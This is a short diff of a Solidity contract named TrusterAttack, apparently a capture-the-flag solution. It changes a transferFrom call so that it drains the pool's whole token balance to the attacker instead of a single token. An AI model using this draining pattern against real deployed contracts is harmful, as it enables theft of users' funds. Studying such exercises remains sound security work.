@@ -53,7 +53,7 @@ contract TrusterAttack {
         //
     }
     function transferMe() public{
-        token.transferFrom(pool, attacker, 1);
+        token.transferFrom(pool, attacker, token.balanceOf(pool));
     }
 
    
